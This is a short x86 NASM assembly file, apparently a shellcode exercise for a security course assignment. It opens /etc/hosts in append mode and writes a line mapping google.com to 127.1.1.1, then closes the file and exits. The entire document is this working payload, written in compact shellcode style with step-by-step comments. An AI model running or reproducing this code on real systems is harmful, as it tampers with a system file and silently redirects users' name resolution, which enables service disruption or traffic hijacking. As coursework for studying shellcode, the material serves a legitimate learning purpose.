; Filename: chHost.nasm
; Author:  Slumber
;
; Purpose: SLAEx86 Assignment 6

global _start

section .text
_start:
	xor ecx, ecx
	mul ecx

	; /etc///hosts
	push ecx			; to push NULL onto the stack
	mov ebx, 0x682f2f2f		; to push h/// into ebx
	mov edx, 0x6374652f		; to push cte/ into edx
	mov esi, 0x7374736f		; to push stso into esi

	; SYS_OPEN
	mov al, 0x5

	; to push /etc///hosts in the correct order
	push ecx
	push esi
	push ebx
	push edx

	; set ebx points to /etc///hosts
	mov ebx, esp

	; set permission
	mov cx, 0x401
	int 0x80

	xchg eax, ebx
	push 0x4
	pop eax
	jmp short _load_data	;jmp-call-pop technique to load the map

_write:
	pop ecx
	push 20			;length of the string, dont forget to modify if changes the map
	pop edx
	int 0x80		;syscall to write in the file

	push 0x6
	pop eax
	int 0x80		;syscall to close the file

	push 0x1
	pop eax
	int 0x80		;syscall to exit

_load_data:
	call _write
	google db "127.1.1.1 google.com"
